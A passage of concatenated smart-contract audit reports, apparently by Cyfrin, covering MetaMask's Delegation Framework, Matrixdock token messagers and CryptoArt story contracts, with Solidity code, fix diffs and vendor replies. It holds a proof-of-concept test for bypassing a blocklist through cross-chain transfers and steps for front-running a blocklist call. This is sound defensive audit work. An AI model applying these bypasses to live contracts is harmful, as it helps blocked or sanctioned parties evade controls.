This function executes a low level call and assigns the success the result of the call applying an is zero operator. This implementation is wrong because the result of a low level call already returns 1 on success and 0 on error. So applying an is zero operator will flip the result and be erroneus.
The result of this will be that when executing a transaction in try mode, successful executions will emit the `TryExecuteUnsuccessful` and failing executions will not. This can confuse the user if these events are used by the UI.

**Impact:** Incorrect event emission

**Recommended Mitigation:** Consider updating the commit version to the latest one, [it does not have this bug anymore](https://github.com/erc7579/erc7579-implementation/blob/main/src/core/ExecutionHelper.sol#L81)


**MetaMask:**
Resolved in commit [73e719](https://github.com/MetaMask/delegation-framework/commit/73e719dd25fe990d614f00203f089f4fd8b4761c).

**Cyfrin:** Resolved.


### Wrong event data field in `ERC20PeriodTransferEnforcer`

**Description:** In the `ERC20PeriodTransferEnforcer` it emits the following event when this caveat is used:
```solidity
    /**
     * @notice Emitted when a transfer is made, updating the transferred amount in the active period.
     * @param sender The address initiating the transfer.
@>   * @param recipient The address that receives the tokens.
     * @param delegationHash The hash identifying the delegation.
     * @param token The ERC20 token contract address.
     * @param periodAmount The maximum tokens transferable per period.
     * @param periodDuration The duration of each period (in seconds).
     * @param startDate The timestamp when the first period begins.
     * @param transferredInCurrentPeriod The total tokens transferred in the current period after this transfer.
     * @param transferTimestamp The block timestamp at which the transfer was executed.
     */
    event TransferredInPeriod(
        address indexed sender,
@>      address indexed recipient,
        bytes32 indexed delegationHash,
        address token,
        uint256 periodAmount,
        uint256 periodDuration,
        uint256 startDate,
        uint256 transferredInCurrentPeriod,
        uint256 transferTimestamp
    );
```
As we can see, the second field is the token recipient. However, in other token related caveats such as `ERC20StreamingEnforcer` and `NativeTokenStreamingEnforcer` the second field in the emitted event data is the `redeemer`, the address that redeems the delegation.

It makes sense that this should be the intended behavior because the data passed to the event is indeed the `redeemer`:
```solidity
    function _validateAndConsumeTransfer(
        bytes calldata _terms,
        bytes calldata _executionCallData,
        bytes32 _delegationHash,
        address _redeemer
    )
        private
    {
        ...
        emit TransferredInPeriod(
            msg.sender,
@>          _redeemer,
            _delegationHash,
            token_,
            periodAmount_,
            periodDuration_,
            allowance_.startDate,
            allowance_.transferredInCurrentPeriod,
            block.timestamp
        );
    }
```

**Impact:** The event field is misleading.

**Recommended Mitigation:**
```diff
    event TransferredInPeriod(
        address indexed sender,
--      address indexed recipient,
++      address indexed redeemer,
        bytes32 indexed delegationHash,
        address token,
        uint256 periodAmount,
        uint256 periodDuration,
        uint256 startDate,
        uint256 transferredInCurrentPeriod,
        uint256 transferTimestamp
    );
```

**MetaMask:**
Resolved in commit [15e0860](https://github.com/MetaMask/delegation-framework/commit/15e0860e45563ac4891a3b4484acbd6f66d3ab24).

**Cyfrin:** Resolved.

\clearpage
## Informational


### First transaction on `SpecificActionERC20TransferBatchEnforcer` does not support sending native value

**Description:** The `SpecificActionERC20TransferBatchEnforcer` is an enforcer to execute an arbitrary transaction first that is constrained by the delegator and afterwards an ERC20 transfer. Both executions are constrained to not support sending value:
```solidity
    function beforeHook(
        bytes calldata _terms,
        bytes calldata,
        ModeCode _mode,
        bytes calldata _executionCallData,
        bytes32 _delegationHash,
        address _delegator,
        address
    )
        public
        override
        onlyBatchCallTypeMode(_mode)
        onlyDefaultExecutionMode(_mode)
    {
        ...

        // Validate first transaction
        if (
            executions_[0].target != terms_.firstTarget || executions_[0].value != 0
                || keccak256(executions_[0].callData) != keccak256(terms_.firstCalldata)
        ) {
            revert("SpecificActionERC20TransferBatchEnforcer:invalid-first-transaction");
        }

        // Validate second transaction
        if (
            executions_[1].target != terms_.tokenAddress || executions_[1].value != 0 || executions_[1].callData.length != 68
                || bytes4(executions_[1].callData[0:4]) != IERC20.transfer.selector
                || address(uint160(uint256(bytes32(executions_[1].callData[4:36])))) != terms_.recipient
                || uint256(bytes32(executions_[1].callData[36:68])) != terms_.amount
        ) {
            revert("SpecificActionERC20TransferBatchEnforcer:invalid-second-transaction");
        }

        ...
    }
```
This check makes sense for the ERC20 transfer execution. However, for the first transaction may be too limited for the delegator that may want to include value along with the execution.

**Recommended Mitigation:** Consider removing the value check for the first transaction to enable the delegator to have more freedom when constraining the first execution. Note that the delegator can always constrain the value field with other enforcers.
```diff
    function beforeHook(
        bytes calldata _terms,
        bytes calldata,
        ModeCode _mode,
        bytes calldata _executionCallData,
        bytes32 _delegationHash,
        address _delegator,
        address
    )
        public
        override
        onlyBatchCallTypeMode(_mode)
        onlyDefaultExecutionMode(_mode)
    {
        ...

        // Validate first transaction
        if (
--          executions_[0].target != terms_.firstTarget || executions_[0].value != 0
++          executions_[0].target != terms_.firstTarget
                || keccak256(executions_[0].callData) != keccak256(terms_.firstCalldata)
        ) {
            revert("SpecificActionERC20TransferBatchEnforcer:invalid-first-transaction");
        }
        ...
    }
```

**Metamask:** Acknowledged. We need this for a specific use case where native token (ETH) is not involved.

**Cyfrin:** Acknowledged.

\clearpage
## Gas Optimization


### `ERC20PeriodTransferEnforcer` gas optimizations

**Description:**
1. The current implementation of `_validateAndConsumeTransfer` performs several validations on every function call, even though some of these validations are only need to be performed once during the first execution for a given delegation hash. Since the terms of a delegation are immutable and time only increases, these checks become redundant after the first successful execution. This causes unnecessary gas consumption on subsequent calls. Consider moving the term validations and time check inside the initialization block so they're only performed once per delegation hash.
```diff
    function _validateAndConsumeTransfer(
        bytes calldata _terms,
        bytes calldata _executionCallData,
        bytes32 _delegationHash,
        address _redeemer
    )
        private
    {
        ...

        // Validate terms
--      require(startDate_ > 0, "ERC20PeriodTransferEnforcer:invalid-zero-start-date");
--      require(periodDuration_ > 0, "ERC20PeriodTransferEnforcer:invalid-zero-period-duration");
--      require(periodAmount_ > 0, "ERC20PeriodTransferEnforcer:invalid-zero-period-amount");

        require(token_ == target_, "ERC20PeriodTransferEnforcer:invalid-contract");
        require(bytes4(callData_[0:4]) == IERC20.transfer.selector, "ERC20PeriodTransferEnforcer:invalid-method");

        // Ensure the transfer period has started.
--      require(block.timestamp >= startDate_, "ERC20PeriodTransferEnforcer:transfer-not-started");

        PeriodicAllowance storage allowance_ = periodicAllowances[msg.sender][_delegationHash];

        // Initialize the allowance on first use.
        if (allowance_.startDate == 0) {
            allowance_.periodAmount = periodAmount_;
            allowance_.periodDuration = periodDuration_;
            allowance_.startDate = startDate_;
            allowance_.lastTransferPeriod = 0;
            allowance_.transferredInCurrentPeriod = 0;

++          require(startDate_ > 0, "ERC20PeriodTransferEnforcer:invalid-zero-start-date");
++          require(periodDuration_ > 0, "ERC20PeriodTransferEnforcer:invalid-zero-period-duration");
++          require(periodAmount_ > 0, "ERC20PeriodTransferEnforcer:invalid-zero-period-amount");
++          require(block.timestamp >= startDate_, "ERC20PeriodTransferEnforcer:transfer-not-started");
        }

        ...
    }
```

2. Unnecessary storage writes
```diff
    function _validateAndConsumeTransfer(
        bytes calldata _terms,
        bytes calldata _executionCallData,
        bytes32 _delegationHash,
        address _redeemer
    )
        private
    {
        ...
        PeriodicAllowance storage allowance_ = periodicAllowances[msg.sender][_delegationHash];
        // Initialize the allowance on first use.
        if (allowance_.startDate == 0) {
            allowance_.periodAmount = periodAmount_;
            allowance_.periodDuration = periodDuration_;
            allowance_.startDate = startDate_;
--          allowance_.lastTransferPeriod = 0;
--          allowance_.transferredInCurrentPeriod = 0;
        }
        ...
    }
```
These 2 variables are updated afterwards and are already initialized at 0. Hence, it makes no sense to set them to 0 upon initialization.

3. Unnecessary storage read
```diff
    function _validateAndConsumeTransfer(
        bytes calldata _terms,
        bytes calldata _executionCallData,
        bytes32 _delegationHash,
        address _redeemer
    )
        private
    {
        emit TransferredInPeriod(
            msg.sender,
            _redeemer,
            _delegationHash,
            token_,
            periodAmount_,
            periodDuration_,
--          allowance_.startDate,
++          startDate_,
            allowance_.transferredInCurrentPeriod,
            block.timestamp
        );
    }
```
No need to read the start date from storage because it is already cached

**Metamask:** Resolved in commit [d08147](https://github.com/MetaMask/delegation-framework/commit/d0814747409cf41d098e369e3f481fbb6a24e92).

**Cyfrin:** Resolved.


### `NativeTokenStreamingEnforcer` and `ERC20TokenStreamingEnforcer` gas optimizations

**Description:**
1. Cache the amount spent to avoid multiple storage reads:
```diff
    function _validateAndConsumeAllowance(
        bytes calldata _terms,
        bytes calldata _executionCallData,
        bytes32 _delegationHash,
        address _redeemer
    )
        private
    {
        (, uint256 value_,) = _executionCallData.decodeSingle();
        (uint256 initialAmount_, uint256 maxAmount_, uint256 amountPerSecond_, uint256 startTime_) = getTermsInfo(_terms);
        require(maxAmount_ >= initialAmount_, "NativeTokenStreamingEnforcer:invalid-max-amount");
        require(startTime_ > 0, "NativeTokenStreamingEnforcer:invalid-zero-start-time");
        StreamingAllowance storage allowance_ = streamingAllowances[msg.sender][_delegationHash];
++      uint256 currentAmountSpent = allowance_.spent;
--      if (allowance_.spent == 0) {
++      if (currentAmountSpent == 0) {
            // First use of this delegation
            allowance_.initialAmount = initialAmount_;
            allowance_.maxAmount = maxAmount_;
            allowance_.amountPerSecond = amountPerSecond_;
            allowance_.startTime = startTime_;
        }
        require(value_ <= _getAvailableAmount(allowance_), "NativeTokenStreamingEnforcer:allowance-exceeded");
--      allowance_.spent += value_;
++      allowance_.spent = value_ + currentAmountSpent;
        emit IncreasedSpentMap(
            msg.sender,
            _redeemer,
            _delegationHash,
            initialAmount_,
            maxAmount_,
            amountPerSecond_,
            startTime_,
--          allowance_.spent,
++          value_ + currentAmountSpent,
            block.timestamp
        );
    }
```

2. Avoid overriding storage data when spent is 0 and data is already set
```diff
    function _validateAndConsumeAllowance(
        bytes calldata _terms,
        bytes calldata _executionCallData,
        bytes32 _delegationHash,
        address _redeemer
    )
        private
    {
        ...
        StreamingAllowance storage allowance_ = streamingAllowances[msg.sender][_delegationHash];
--      if (allowance_.spent == 0) {
++      if (allowance_.spent == 0 && allowance_.startTime == 0) {
            // First use of this delegation
            allowance_.initialAmount = initialAmount_;
            allowance_.maxAmount = maxAmount_;
            allowance_.amountPerSecond = amountPerSecond_;
            allowance_.startTime = startTime_;
        }
        ...
    }
```

3. Total spent is impossible to be greater than the amount unlocked, hence checking if the amount spent is greater than or equal to the amount unlocked is unnecessary. Just a single equal operator is enough:
```diff
    function _getAvailableAmount(StreamingAllowance memory _allowance) private view returns (uint256) {
        if (block.timestamp < _allowance.startTime) return 0;
        uint256 elapsed_ = block.timestamp - _allowance.startTime;
        uint256 unlocked_ = _allowance.initialAmount + (_allowance.amountPerSecond * elapsed_);
        if (unlocked_ > _allowance.maxAmount) {
            unlocked_ = _allowance.maxAmount;
        }
--      if (_allowance.spent >= unlocked_) return 0;
++      if (_allowance.spent == unlocked_) return 0;
        return unlocked_ - _allowance.spent;
    }
```

**Metamask:** Acknowledged.

**Cyfrin:** Acknowledged.


### Unnecessary execution mode support in `DelegationMetaSwapAdapter`

**Description:** The `executeFromExecutor` function in the `DelegationMetaSwapAdapter` supports multiple execution modes (batch/single) and execution types (default/try). However, in practice, the adapter's main function swapByDelegation only ever uses the encodeSimpleSingle mode with default execution type.

This implementation includes complex conditional logic that handles multiple code paths that are never utilized in the current application:


```solidity
    function swapByDelegation(bytes calldata _apiData, Delegation[] memory _delegations) external {
        ...
        ModeCode[] memory encodedModes_ = new ModeCode[](2);
        encodedModes_[0] = ModeLib.encodeSimpleSingle();
        encodedModes_[1] = ModeLib.encodeSimpleSingle();
        ...
    }

    function executeFromExecutor(
        ModeCode _mode,
        bytes calldata _executionCalldata
    )
        external
        payable
        onlyDelegationManager
        returns (bytes[] memory returnData_)
    {
        (CallType callType_, ExecType execType_,,) = _mode.decode();

        // Check if calltype is batch or single
        if (callType_ == CALLTYPE_BATCH) {
            // Destructure executionCallData according to batched exec
            Execution[] calldata executions_ = _executionCalldata.decodeBatch();
            // check if execType is revert or try
            if (execType_ == EXECTYPE_DEFAULT) returnData_ = _execute(executions_);
            else if (execType_ == EXECTYPE_TRY) returnData_ = _tryExecute(executions_);
            else revert UnsupportedExecType(execType_);
        } else if (callType_ == CALLTYPE_SINGLE) {
            // Destructure executionCallData according to single exec
            (address target_, uint256 value_, bytes calldata callData_) = _executionCalldata.decodeSingle();
            returnData_ = new bytes[](1);
            bool success_;
            // check if execType is revert or try
            if (execType_ == EXECTYPE_DEFAULT) {
                returnData_[0] = _execute(target_, value_, callData_);
            } else if (execType_ == EXECTYPE_TRY) {
                (success_, returnData_[0]) = _tryExecute(target_, value_, callData_);
                if (!success_) emit TryExecuteUnsuccessful(0, returnData_[0]);
            } else {
                revert UnsupportedExecType(execType_);
            }
        } else {
            revert UnsupportedCallType(callType_);
        }
    }
```

**Recommendation**
Consider restricting the `executeFromExecutor` function to only support the execution modes that are actually used in the application:

```solidity
  function executeFromExecutor(
    ModeCode _mode,
    bytes calldata _executionCalldata
)
    external
    payable
    onlyDelegationManager
    returns (bytes[] memory returnData_)
{
    (CallType callType_, ExecType execType_,,) = _mode.decode();

    // Only support single call type with default execution
    if (callType_ != CALLTYPE_SINGLE) {
        revert UnsupportedCallType(callType_);
    }

    if (execType_ != EXECTYPE_DEFAULT) {
        revert UnsupportedExecType(execType_);
    }

    // Process single execution directly without additional checks
    (address target_, uint256 value_, bytes calldata callData_) = _executionCalldata.decodeSingle();
    returnData_ = new bytes[](1);
    returnData_[0] = _execute(target_, value_, callData_);

    return returnData_;
}
```

**Metamask:** Resolved in commit [afb243c](https://github.com/MetaMask/delegation-framework/commit/afb243cdff4960c51170f58e0058912e7dec392a).

**Cyfrin:** Resolved.

\clearpage

------ FILE END car/reports_md/2025-04-01-cyfrin-Metamask-DelegationFramework2-v2.0.md ------


------ FILE START car/reports_md/2025-04-09-cyfrin-matrixdock-v2.0.md ------

**Lead Auditors**

[Dacian](https://x.com/DevDacian)

[Hans](https://x.com/hansfriese)

**Assisting Auditors**



---

# Findings
## Low Risk


### Forcing CCIP native fee payment results in 10 percent higher costs for `LINK` holders

**Description:** CCIP allows users to pay using either `LINK` or native gas token. By hard-coding `EVM2AnyMessage::feeToken = address(0)` the protocol forces all users to pay using the native gas token.

This results in [higher costs](https://docs.chain.link/ccip/billing#network-fee-table) for `LINK` holders as CCIP offers a 10% discount for paying using `LINK`, though this does simplify the protocol implementation.

**Matrixdock:** Acknowledged.


### Users can use transfer and bridging to evade having their tokens frozen via the blocklist

**Description:** One unconventional application of regular transfers or cross-chain transfers via CCIP / LayerZero bridging is to evade the blocklist:
* user sees operator call to `MToken::addToBlockedList` in mempool which would block their address
* user front-runs this transaction by a normal transfer or a CCIP / LayerZero cross-chain transfer to bridge their tokens to a new `receiver` address on another chain
* if the operator attempts to call `MToken::addToBlockedList` on the other chain for the new `receiver` address, the user can bridge back to another new address again

To prevent this the operator can:
* pause bridging (pausing has been implemented for LayerZero but not CCIP) prior to calling `MToken::addToBlockedList`
* use a service such as [flashbots](https://www.flashbots.net/) when calling `MToken::addToBlockedList` so the transaction is not exposed in a public mempool

**Matrixdock:** Acknowledged.


### Missing `receive` function to reject direct ETH transfers in messager contracts

**Description:** The messager contracts (`MTokenMessager`, `MTokenMessagerLZ`, `MTokenMessagerV2`) are designed to receive the bridging fee in native token but none of them implemented a `receive()` function to handle direct ETH transfers. Without this function, users can accidentally send ETH to the contract address where it will be permanently locked since there's no mechanism to withdraw it.

**Recommended Mitigation:** Add a `receive()` function that reverts to explicitly reject any direct ETH transfers to the contract:

```diff
3 contract MTokenMessagerBase {
4
5     address public ccipClient;//@audit-info MToken
6
7     constructor(address _ccipClient){
8         ccipClient = _ccipClient;
9     }
+
+     receive() external payable {
+         revert("ETH transfers not accepted");
+     }
10 }
```

**Matrixdock:** Acknowledged.



### Cross-chain blocked recipients aren't properly handled

**Description:** The `MToken` contract implements a blocking mechanism to prevent certain addresses from interacting with the token. However, the cross-chain functionality doesn't properly handle blocked addresses.

There are two key issues:

1. In `MToken::msgOfCcSendToken`, the contract checks if the `receiver` is blocked on the source chain, but this check is invalid since the receiver exists on the destination chain.
```solidity
369:    function msgOfCcSendToken(
370:        address sender,
371:        address receiver,
372:        uint256 value
373:    ) public view returns (bytes memory message) {
374:        _checkBlocked(sender);
375:        _checkBlocked(receiver);//@audit-issue receiver is not on the same chain, so this check does not make sense
376:        return abi.encode(TagSendToken, abi.encode(sender, receiver, value));
377:    }
```

2. In `MToken::ccReceiveToken`, there's no check to verify if the `receiver` is blocked on the current (destination) chain before minting tokens to them.
```solidity
415:    function ccReceiveToken(bytes memory message) internal {
416:        (address sender, address receiver, uint value) = abi.decode(
417:            message,
418:            (address, address, uint)
419:        );
420:        _mint(receiver, value);//@audit-issue should check if receiver is blocked, might need to manage the funds sent to the blocked address
421:        emit CCReceiveToken(sender, receiver, value);
422:    }
```
These issues could allow blocked addresses to receive tokens via cross-chain transfers, bypassing the security controls intended by the protocol.

**Impact:** The blocking mechanism can be bypassed using cross-chain transfers. Malicious or sanctioned addresses that are blocked on one chain can still receive tokens through cross-chain transfers, undermining the security feature of the protocol.

**Proof Of Concept:**
```solidity
    // Test cross-chain sending to a blocked address
    function testCrossChainSendToken_ToBlockedAddress() public {
        // Mint some tokens to user1
        uint256 amount = 100 * 10**18;
        mintTokens(user1, amount);

        // Block user2 on the destination chain
        vm.prank(operator);
        remoteChainMToken.addToBlockedList(user2);

        // User1 tries to send tokens cross-chain to blocked user2
        vm.startPrank(user1);
        mtoken.approve(address(mockMessager), amount);

        // When sending to a blocked address, the send may succeed but the tokens should never reach the destination
        mockMessager.sendTokenToChain{value: 0.01 ether}(
            CHAIN_SELECTOR_2,
            address(remoteChainMToken),
            user2,
            amount,
            ""
        );
        vm.stopPrank();

        // Check that user1's tokens are gone (burned in the sending process)
        assertEq(mtoken.balanceOf(user1), 0, "Tokens should be burned on source chain");

        // The blocked user should NOT receive any tokens
        // assertEq(remoteChainMToken.balanceOf(user2), 0, "Blocked user should not receive tokens");
    }
```

**Recommended Mitigation:**
1. Remove the receiver check in `msgOfCcSendToken` as it's not relevant to the source chain:

```diff
function msgOfCcSendToken(
    address sender,
    address receiver,
    uint256 value
) public view returns (bytes memory message) {
    _checkBlocked(sender);
-   _checkBlocked(receiver);
    return abi.encode(TagSendToken, abi.encode(sender, receiver, value));
}
```

2. Add a blocked address check in `ccReceiveToken` and implement a mechanism to handle tokens sent to blocked addresses:

```diff
function ccReceiveToken(bytes memory message) internal {
    (address sender, address receiver, uint value) = abi.decode(
        message,
        (address, address, uint)
    );
+   if (isBlocked[receiver]) {
+       // Option 1: Send to a recovery address
+       _mint(operator, value);
+       emit CCReceiveBlockedAddress(sender, receiver, value);
+   } else {
        _mint(receiver, value);
+   }
    emit CCReceiveToken(sender, receiver, value);
}
```

**Matrixdock:** Acknowledged.


\clearpage
## Informational


### Only emit events when state actually changes

**Description:** Only emit events when state actually changes, for example in `MTokenMessager::setAllowedPeer`:
```diff
    function setAllowedPeer(
        uint64 chainSelector,
        address messager,
        bool allowed
    ) external onlyOwner {
+      require(chainSelector][messager] != allowed, "No state change");
       allowedPeer[chainSelector][messager] = allowed;
       emit AllowedPeer(chainSelector, messager, allowed);
    }
```

Also affects:
* `MTokenMessagerV2::setAllowedPeer`

**Matrixdock:** Acknowledged.


### Use named mappings

**Description:** Use named mappings to explicity indicate purpose of index => value:
```solidity
MTokenMessager.sol
16:    mapping(uint64 => mapping(address => bool)) public allowedPeer;
//     mapping(uint64 chainSelector => mapping(address messager => bool allowed)) public allowedPeer;

MTokenMessagerV2.sol
28:    mapping(uint64 => mapping(address => bool)) public allowedPeer;
//     mapping(uint64 chainSelector => mapping(address messager => bool allowed)) public allowedPeer;
```

**Matrixdock:** Fixed in commit [f3fbe97](https://github.com/Matrixdock-RWA/RWA-Contracts/commit/f3fbe97bd20ad514b76aa422a7dfc1f8a66cd66b#diff-f1dbc2c2c340ac285844595cba6f20040bb8b33c2ae726867955370039433c6aR11-R28) for `MTokenMessagerV2`.

**Cyfrin:** Resolved.


### Emit missing events for important state changes

**Description:** Emit missing events for important state changes:
* `MTokenMessagerLZ::setLZPaused`

**Matrixdock:** Fixed in commit [f3fbe97](https://github.com/Matrixdock-RWA/RWA-Contracts/commit/f3fbe97bd20ad514b76aa422a7dfc1f8a66cd66b#diff-591d4d35e5121caa982af913bb68ff10a5555b9462a19650bfd5b844ecedee43R31).

**Cyfrin:** Verified.


### LayerZero integration can be paused but CCIP integration can't be paused

**Description:** `MTokenMessagerLZ` has a `bool lzPaused` storage slot and uses `onlyLZNotPaused` modifier to make LayerZero send/receive revert when paused.

In contrast `MTokenMessager` and `MTokenMessagerV2` have no similar pausing functionality for CCIP send/receive.

Consider whether this asymmetry is intentional or whether the CCIP send/receive should similarly be able to be paused.

**Matrixdock:** Acknowledged.


### Don't allow pausing for LayerZero receive, only send

**Description:** `MTokenMessagerLZ` has the `onlyLZNotPaused` modifier on both the receiving function `_lzReceive` and the two sending functions `lzSendTokenToChain` / `lzSendMintBudgetToChain`.

Consider removing the `onlyLZNotPaused` modifier from `_lzReceive`  as the sender has already burned their tokens when sending, so don't want receiving to revert in this case.

**Matrixdock:** Fixed in commit [f3fbe97](https://github.com/Matrixdock-RWA/RWA-Contracts/commit/f3fbe97bd20ad514b76aa422a7dfc1f8a66cd66b#diff-591d4d35e5121caa982af913bb68ff10a5555b9462a19650bfd5b844ecedee43L46).

**Cyfrin:** Verified.


### Use consistent prefix for `internal` function names

**Description:** Some of the `internal` functions use a `_` prefix character but others don't. Use `_` as a consistent prefix for all `internal` function names:

* `MTokenMessager::sendDataToChain`
* `MTokenMessagerLZ::sendThroughLZ`
* `MTokenMessagerV2::sendDataToChain`

**Matrixdock:** Acknowledged.


### Use named imports

**Description:** The contracts mostly use named imports but strangely some import statements don't; use named imports everywhere:

`MTokenMessager`:
```solidity
import "./interfaces/ICCIPClient.sol";
```

`MTokenMessagerLZ`:
```solidity
import "./MTokenMessagerBase.sol";
import "./interfaces/ICCIPClient.sol";
```

`MTokenMessagerV2`:
```solidity
import "./interfaces/ICCIPClient.sol";
import "./MTokenMessagerLZ.sol";
```

**Matrixdock:** Fixed in commit [f3fbe97](https://github.com/Matrixdock-RWA/RWA-Contracts/commit/f3fbe97bd20ad514b76aa422a7dfc1f8a66cd66b) for `MTokenMessagerLZ` and `MTokenMessagerV2`.

**Cyfrin:** Verified.


### Consider renaming `MTokenMessagerBase::ccipClient` as it is used by LayerZero integration and actually refers to `MToken`

**Description:** `MTokenMessager::ccipClient` and `MTokenMessagerBase::ccipClient` are used by both LayerZero (`MTokenMessagerLZ`) and CCIP (MTokenMessagerV2`).

But they actually simply reference the `MToken` contract. Calling them `ccipClient` is initially confusing especially when reading the LayerZero integration and wondering why it is calling `ccipClient`.

Consider renaming `MTokenMessager::ccipClient` and `MTokenMessagerBase::ccipClient` to `mToken` and simply adding the additional functions to `IMToken` then deleting `ICCIPClient`.

**Matrixdock:** Fixed in commit [f3fbe97](https://github.com/Matrixdock-RWA/RWA-Contracts/commit/f3fbe97bd20ad514b76aa422a7dfc1f8a66cd66b#diff-dab651c3b43b10cc975bd594f600387ed27d1bffd16250f576c85820925fab9aR6-R9) for `MTokenMessagerBase`.

**Cyfrin:** Verified.


### Unused event `OwnershipTransferRequested` in `MTokenMessagerLZ`

**Description:** The `MTokenMessagerLZ` contract declares an `OwnershipTransferRequested` event but never emits it anywhere in the contract. This suggests there might have been plans to implement a timelock mechanism for ownership transfer, but it was not completed. The event is defined but remains unused, which could indicate incomplete functionality.

```solidity
18:     event OwnershipTransferRequested(address indexed from, address indexed to);
```

**Matrixdock:** Removed in commit [f3fbe97](https://github.com/Matrixdock-RWA/RWA-Contracts/commit/f3fbe97bd20ad514b76aa422a7dfc1f8a66cd66b#diff-591d4d35e5121caa982af913bb68ff10a5555b9462a19650bfd5b844ecedee43L18-R30).

**Cyfrin:** Verified.



### Unnecessary code duplication in `MTokenMessager::sendDataToChain`

**Description:** The `sendDataToChain` function creates a message object and calculates fees, duplicating logic that already exists in the `getFeeAndMessage` function. This creates redundancy in the codebase, which can lead to inconsistencies during future updates and increases gas costs.

**Recommended Mitigation:** Refactor the `sendDataToChain` function to use the existing `getFeeAndMessage` function:

```diff
    function sendDataToChain(
        uint64 destinationChainSelector,
        address messageReceiver,
        bytes calldata extraArgs,
        bytes memory data
    ) internal returns (bytes32 messageId) {
-        Client.EVM2AnyMessage memory evm2AnyMessage = Client.EVM2AnyMessage({
-            receiver: abi.encode(messageReceiver),
-            data: data,
-            tokenAmounts: new Client.EVMTokenAmount[](0),
-            extraArgs: extraArgs,
-            feeToken: address(0)
-        });
-        uint256 fee = IRouterClient(getRouter()).getFee(
-            destinationChainSelector,
-            evm2AnyMessage
-        );
+        (uint256 fee, Client.EVM2AnyMessage memory evm2AnyMessage) = getFeeAndMessage(
+            destinationChainSelector,
+            messageReceiver,
+            extraArgs,
+            data
+        );
        if (msg.value < fee) {
            revert InsufficientFee(fee, msg.value);
        }
        messageId = IRouterClient(getRouter()).ccipSend{value: fee}(
            destinationChainSelector,
            evm2AnyMessage
        );
        if (msg.value - fee > 0) {
            payable(msg.sender).sendValue(msg.value - fee);
        }
        return messageId;
    }
```

The same issue is also present in `MTokenMessagerV2::sendDataToChain`.

**Matrixdock:** Fixed in commit [f3fbe97](https://github.com/Matrixdock-RWA/RWA-Contracts/commit/f3fbe97bd20ad514b76aa422a7dfc1f8a66cd66b#diff-f1dbc2c2c340ac285844595cba6f20040bb8b33c2ae726867955370039433c6aR183) for `MTokenMessagerV2`.

**Cyfrin:** Verified.



\clearpage
## Gas Optimization


### Use `immutable` for storage slots only set once in the constructor of non-upgradeable contracts

**Description:** Use `immutable` for storage slots only set once in the constructor:
* `MTokenMessager::ccipClient`
* `MTokenMessagerBase::ccipClient`

**Matrixdock:** Fixed in commit [f3fbe97](https://github.com/Matrixdock-RWA/RWA-Contracts/commit/f3fbe97bd20ad514b76aa422a7dfc1f8a66cd66b#diff-dab651c3b43b10cc975bd594f600387ed27d1bffd16250f576c85820925fab9aR6-L8) for `MTokenMessagerBase`.

**Cyfrin:** Verified.


### Use named returns especially for `memory` outputs

**Description:** Use named returns especially for `memory` outputs, eg in `MTokenMessager::calculateCCSendTokenFeeAndMessage`:
```diff
    function calculateCCSendTokenFeeAndMessage(
        uint64 destinationChainSelector,
        address messageReceiver,
        address sender,
        address recipient,
        uint value,
        bytes calldata extraArgs
    )
        public
        view
        returns (uint256 fee, Client.EVM2AnyMessage memory evm2AnyMessage)
    {
        bytes memory data = ccipClient.msgOfCcSendToken(
            sender,
            recipient,
            value
        );
-       return
+       (fee, evm2AnyMessage) =
            getFeeAndMessage(
                destinationChainSelector,
                messageReceiver,
                extraArgs,
                data
            );
    }
```

Also applies to:
* `MTokenMessager::calculateCcSendMintBudgetFeeAndMessage`
* `MTokenMessager::sendDataToChain` where obsolete `return` can be removed
* the same functions in `MTokenMessagerV2`

**Matrixdock:** Fixed in commit [f3fbe97](https://github.com/Matrixdock-RWA/RWA-Contracts/commit/f3fbe97bd20ad514b76aa422a7dfc1f8a66cd66b#diff-f1dbc2c2c340ac285844595cba6f20040bb8b33c2ae726867955370039433c6aR82-R102) for `MTokenMessagerV2`.

**Cyfrin:** Verified.


### Cache amount and use Solady `SafeTransferLib::safeTransferETH` when refunding excess fee

**Description:** In `MTokenMessager::sendDataToChain` and `MTokenMessagerV2::sendDataToChain`, cache the amount and [use Solady](https://github.com/devdacian/solidity-gas-optimization?tab=readme-ov-file#10-use-safetransferlibsafetransfereth-instead-of-solidity-call-effective-035-cheaper) `SafeTransferLib::safeTransferETH` when refunding excess fee:
```diff
+ import {SafeTransferLib} from "@solady/utils/SafeTransferLib.sol";

-       if (msg.value - fee > 0) {
-           payable(msg.sender).sendValue(msg.value - fee);
-       }
+       uint256 excessFee = msg.value - fee;
+       if(excessFee > 0) {
+           SafeTransferLib.safeTransferETH(msg.sender, excessFee);
+       }
```

**Matrixdock:** Acknowledged.

\clearpage

------ FILE END car/reports_md/2025-04-09-cyfrin-matrixdock-v2.0.md ------


------ FILE START car/reports_md/2025-04-24-cyfrin-cryptoart-v2.0.md ------

**Lead Auditors**

[Dacian](https://x.com/DevDacian)

[Hans](https://x.com/hansfriese)
**Assisting Auditors**



---

# Findings
## Medium Risk


### Collector can add `CreatorStory`, corrupting the provenance of an artwork

**Description:** The purpose of the `IStory` interface is to allow 3 different entities (Admin, Creator and Collectors) to add "Stories" about a given artwork (NFT) which [describes the provenance of the artwork](https://docs.transientlabs.xyz/tl-creator-contracts/common-features/story-inscriptions). In the art world the "provenance" of an item can affect its status and price, so the `IStory` interface aims to facilitate an on-chain record of an artwork's "provenance".

`IStory` is designed to work like this:
* Creator/Admin can add a `CollectionsStory` for when a collection is added to a contract
* Creator of an artwork can add a `CreatorStory`
* Collector of an artwork can add one or more `Story` about their experience while holding the artwork

The `IStory` interface specification requires that `addCreatorStory` is only called by the creator:
```solidity
/// @notice Function to let the creator add a story to any token they have created
/// @dev This function MUST implement logic to restrict access to only the creator
function addCreatorStory(uint256 tokenId, string calldata creatorName, string calldata story) external;
```

But in the CryptoArt implementation of the `IStory` interface, the current token owner can always emit `CreatorStory` events:
```solidity
function addCreatorStory(uint256 tokenId, string calldata, /*creatorName*/ string calldata story)
    external
    onlyTokenOwner(tokenId)
{
    emit CreatorStory(tokenId, msg.sender, msg.sender.toHexString(), story);
}
```

**Impact:** As an NFT is sold or transferred to new owners, each subsequent owner can continue to add new `CreatorStory` events even though they aren't the Creator of the artwork. This corrupts the provenance of the artwork by allowing Collectors to add to the `CreatorStory` as if they were the Creator.

**Recommended Mitigation:** Only the Creator of an artwork should be able to emit the `CreatorStory` event. Currently the on-chain protocol does not record the address of the creator; this could either be added or `onlyOwner` could be used where the contract owner acts as a proxy for the creator.

**CryptoArt:**
